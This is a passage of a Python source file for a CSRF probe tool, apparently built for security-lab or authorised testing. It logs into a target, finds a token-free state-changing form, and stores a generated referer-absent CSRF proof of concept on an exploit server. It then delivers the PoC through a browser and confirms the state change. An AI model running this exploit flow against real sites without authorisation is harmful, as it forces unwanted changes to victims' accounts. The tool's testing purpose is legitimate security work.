            "fallback": False,
            "mode": str(parameters["mode"]).lower(),
            "proofLevel": "runtime-browser-state-change",
            "target": target,
            "engagement": str(parameters["engagement"]).lower(),
            "allowUnsafeMethods": True,
            "stateChangeApproved": True,
            **paths,
            **fields,
            "loginCsrfField": login_csrf_field or None,
            "username": username,
            "stateValue": state_value,
            "accountMarker": account_marker,
            "actionUrl": urls["action"],
            "stateFormHasToken": False,
            "stateFormFieldNames": flow["stateForm"]["fieldNames"],
            "stateValueAbsentBefore": True,
            "stateValuePresentAfter": True,
            "stateChanged": True,
            "pocSha256": poc_sha256,
            "pocLength": len(poc_body.encode("utf-8")),
            "browserDelivery": True,
            "refererAbsent": True,
            "deliveryStatus": int(flow["deliveryResponse"]["status"]),
            "requestCount": request_count,
            "auxiliaryRequests": int(flow.get("auxiliaryRequests") or 0),
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [finding],
            "summary": {
                "verified": True,
                "mode": verification["mode"],
                "proofLevel": verification["proofLevel"],
                "browserDelivery": True,
                "requestCount": request_count,
                "findingCount": 1,
            },
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        proof_level = str(parameters["proofLevel"]).lower()
        assert target is not None
        if proof_level == "runtime-browser-state-change":
            return await self._execute_runtime(parameters, target)

        exploit_server = _http_target(parameters.get("exploitServer"))
        assert target is not None and exploit_server is not None
        paths = {
            key: str(parameters[key])
            for key in (
                "loginPath",
                "accountPath",
                "actionPath",
                "exploitStorePath",
                "exploitResourcePath",
            )
        }
        urls = {
            "target": target,
            "login": urljoin(target, paths["loginPath"]),
            "account": urljoin(target, paths["accountPath"]),
            "action": urljoin(target, paths["actionPath"]),
            "exploitStore": urljoin(exploit_server, paths["exploitStorePath"]),
        }
        fields = {
            key: str(parameters[key])
            for key in (
                "usernameField",
                "passwordField",
                "stateField",
                "exploitHttpsField",
                "exploitFileField",
                "exploitHeadField",
                "exploitBodyField",
                "exploitActionField",
            )
        }
        actions = {
            key: str(parameters[key])
            for key in ("exploitHttpsValue", "exploitStoreValue", "exploitDeliverValue")
        }
        username = str(parameters["username"])
        password = str(parameters["password"])
        state_value = str(parameters["stateValue"])
        account_marker = str(parameters["accountMarker"])
        unsolved_marker = str(parameters["unsolvedMarker"])
        solved_marker = str(parameters["solvedMarker"])
        login_csrf_field = str(parameters.get("loginCsrfField") or "").strip()
        timeout = int(parameters.get("timeoutSeconds") or 20)
        poc_body = build_referer_absent_poc(
            urls["action"],
            fields["stateField"],
            state_value,
        )
        poc_sha256 = hashlib.sha256(poc_body.encode("utf-8")).hexdigest()
        store_form = {
            fields["exploitHttpsField"]: actions["exploitHttpsValue"],
            fields["exploitFileField"]: paths["exploitResourcePath"],
            fields["exploitHeadField"]: RESPONSE_HEAD,
            fields["exploitBodyField"]: poc_body,
            fields["exploitActionField"]: actions["exploitStoreValue"],
        }
        store_body = urlencode(store_form)

        request_count = 0
        evidence_steps = []
        login_csrf_token: Optional[str] = None
        browser_result: Optional[Dict[str, Any]] = None
        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            cookie_jar = aiohttp.CookieJar(unsafe=True)
            async with aiohttp.ClientSession(timeout=timeout_config, cookie_jar=cookie_jar) as session:
                baseline = await self._request(session, "GET", urls["target"])
                request_count += 1
                if (
                    baseline["truncated"]
                    or baseline["status"] != 200
                    or unsolved_marker not in baseline["body"]
                    or solved_marker in baseline["body"]
                ):
                    raise ValueError("target baseline did not prove the configured unsolved state")
                evidence_steps.append(
                    build_http_evidence_step(
                        "target-unsolved-baseline",
                        "GET",
                        urls["target"],
                        "",
                        "",
                        baseline,
                        (password,),
                    )
                )

                cookie = _cookie_header(session, urls["login"])
                login_page = await self._request(session, "GET", urls["login"])
                request_count += 1
                if login_page["truncated"] or login_page["status"] != 200:
                    raise ValueError("login page did not return a bounded HTTP 200 response")
                if login_csrf_field:
                    login_csrf_token = extract_form_token(login_page["body"], login_csrf_field)
                    if not login_csrf_token:
                        raise ValueError("configured login CSRF field was not found")
                evidence_steps.append(
                    build_http_evidence_step(
                        "login-page",
                        "GET",
                        urls["login"],
                        "",
                        cookie,
                        login_page,
                        (password, login_csrf_token),
                    )
                )

                login_form = {
                    fields["usernameField"]: username,
                    fields["passwordField"]: password,
                }
                if login_csrf_field and login_csrf_token:
                    login_form[login_csrf_field] = login_csrf_token
                login_body = urlencode(login_form)
                cookie = _cookie_header(session, urls["login"])
                login_response = await self._request(
                    session,
                    "POST",
                    urls["login"],
                    login_body,
                )
                request_count += 1
                login_location = str(login_response["headers"].get("Location") or "")
                login_redirect = urljoin(urls["login"], login_location)
                if (
                    login_response["truncated"]
                    or login_response["status"] not in {302, 303}
                    or not login_location
                    or not _same_origin(target, login_redirect)
                    or _path_and_query(login_redirect) != paths["accountPath"]
                ):
                    raise ValueError("login did not redirect to the configured account path")
                evidence_steps.append(
                    build_http_evidence_step(
                        "approved-login",
                        "POST",
                        urls["login"],
                        login_body,
                        cookie,
                        login_response,
                        (password, login_csrf_token),
                    )
                )

                cookie = _cookie_header(session, urls["account"])
                account_response = await self._request(session, "GET", urls["account"])
                request_count += 1
                state_form = find_state_form(
                    account_response["body"],
                    urls["account"],
                    urls["action"],
                    fields["stateField"],
                )
                if (
                    account_response["truncated"]
                    or account_response["status"] != 200
                    or account_marker not in account_response["body"]
                    or not state_form
                    or state_form.get("valid") is not True
                ):
                    raise ValueError(
                        "account page did not prove the configured token-free state-changing form"
                    )
                evidence_steps.append(
                    build_http_evidence_step(
                        "state-form-baseline",
                        "GET",
                        urls["account"],
                        "",
                        cookie,
                        account_response,
                        (password, login_csrf_token),
                    )
                )

                exploit_cookie = _cookie_header(session, urls["exploitStore"])
                store_response = await self._request(
                    session,
                    "POST",
                    urls["exploitStore"],
                    store_body,
                )
                request_count += 1
                if store_response["truncated"] or store_response["status"] != 200:
                    raise ValueError("exploit host did not accept the generated PoC")
                evidence_steps.append(
                    build_http_evidence_step(
                        "exploit-store",
                        "POST",
                        urls["exploitStore"],
                        store_body,
                        exploit_cookie,
                        store_response,
                        (password, login_csrf_token),
                    )
                )

                browser_result = await self._browser_deliver(
                    urls["exploitStore"],
                    fields["exploitActionField"],
                    actions["exploitDeliverValue"],
                    timeout,
                )
                request_count += 3
                if (
                    browser_result.get("browserUsed") is not True
                    or browser_result.get("loadMethod") != "GET"
                    or browser_result.get("loadUrl") != urls["exploitStore"]
                    or browser_result.get("deliveryMethod") != "POST"
                    or browser_result.get("deliveryUrl") != urls["exploitStore"]
                    or browser_result.get("outcomeMethod") != "GET"
                    or not _same_origin(exploit_server, str(browser_result.get("outcomeUrl") or ""))
                ):
                    raise ValueError("exploit delivery did not use the configured browser flow")
                delivery_form = parse_qs(
                    str(browser_result.get("deliveryBody") or ""),
                    keep_blank_values=True,
                    strict_parsing=True,
                )
                expected_delivery = {
                    **store_form,
                    fields["exploitHeadField"]: canonicalize_form_newlines(RESPONSE_HEAD),
                    fields["exploitBodyField"]: canonicalize_form_newlines(poc_body),
                    fields["exploitActionField"]: actions["exploitDeliverValue"],
                }
                if (
                    any(delivery_form.get(key) != [value] for key, value in expected_delivery.items())
                    or set(delivery_form) != set(expected_delivery)
                ):
                    raise ValueError("browser delivery did not submit the stored generated PoC")
                load_response = browser_result["loadResponse"]
                delivery_response = browser_result["deliveryResponse"]
                outcome_response = browser_result["outcomeResponse"]
                delivery_location = str(delivery_response["headers"].get("location") or "")
                delivery_redirect = urljoin(urls["exploitStore"], delivery_location)
                outcome_url = str(browser_result["outcomeUrl"])
                if (
                    load_response["truncated"]
                    or load_response["status"] != 200
                    or delivery_response["truncated"]
                    or delivery_response["status"] not in {302, 303}
                    or not delivery_location
                    or not _same_origin(exploit_server, delivery_redirect)
                    or outcome_response["truncated"]
                    or outcome_response["status"] != 200
                ):
                    raise ValueError("browser delivery did not complete the expected redirect flow")
                evidence_steps.append(
                    build_http_evidence_step(
                        "browser-exploit-load",
                        "GET",
                        urls["exploitStore"],
                        "",
                        "",
                        load_response,
                        (password, login_csrf_token),
                    )
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        "browser-delivery-click",
                        "POST",
                        urls["exploitStore"],
                        str(browser_result["deliveryBody"]),
                        "",
                        delivery_response,
                        (password, login_csrf_token),
                    )
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        "browser-delivery-result",
                        "GET",
                        outcome_url,
                        "",
                        "",
                        outcome_response,
                        (password, login_csrf_token),
                    )
                )

                confirmation = await self._request(session, "GET", urls["target"])
                request_count += 1
                if (
                    confirmation["truncated"]
                    or confirmation["status"] != 200
                    or solved_marker not in confirmation["body"]
                    or unsolved_marker in confirmation["body"]
                ):
                    raise ValueError("target did not transition to the configured solved state")
                evidence_steps.append(
                    build_http_evidence_step(
                        "target-solved-confirmation",
                        "GET",
                        urls["target"],
                        "",
                        _cookie_header(session, urls["target"]),
                        confirmation,
                        (password, login_csrf_token),
                    )
                )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": request_count,
                "findings": [],
            }

        assert browser_result is not None
        verification = {
            "verified": True,
            "fallback": False,
            "mode": str(parameters["mode"]).lower(),
            "proofLevel": proof_level,
            "target": target,
            "exploitServer": exploit_server,
            "engagement": str(parameters["engagement"]).lower(),
            "allowUnsafeMethods": True,
            "stateChangeApproved": True,
            **paths,
            **fields,
            **actions,
            "loginCsrfField": login_csrf_field or None,
            "username": username,
            "stateValue": state_value,
            "accountMarker": account_marker,
            "unsolvedMarker": unsolved_marker,
            "solvedMarker": solved_marker,
            "actionUrl": urls["action"],
            "exploitStoreUrl": urls["exploitStore"],
            "stateFormHasToken": False,
            "stateFormFieldNames": state_form["fieldNames"],
            "pocSha256": poc_sha256,
            "pocLength": len(poc_body.encode("utf-8")),
            "browserDelivery": True,
            "deliveryStatus": int(browser_result["deliveryResponse"]["status"]),
            "deliveryOutcomeUrl": str(browser_result["outcomeUrl"]),
            "deliveryOutcomeStatus": int(browser_result["outcomeResponse"]["status"]),
            "solvedBefore": False,
            "solvedAfter": True,
            "requestCount": request_count,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "exploitServer": exploit_server,
            "requestCount": request_count,
            "verification": verification,
            "findings": [build_nuclei_finding(target, verification)],
            "summary": {
                "verified": True,
                "mode": verification["mode"],
                "proofLevel": verification["proofLevel"],
                "browserDelivery": True,
                "requestCount": request_count,
                "findingCount": 1,
            },
        }


def get_tool() -> CsrfProbeTool:
    return CsrfProbeTool()
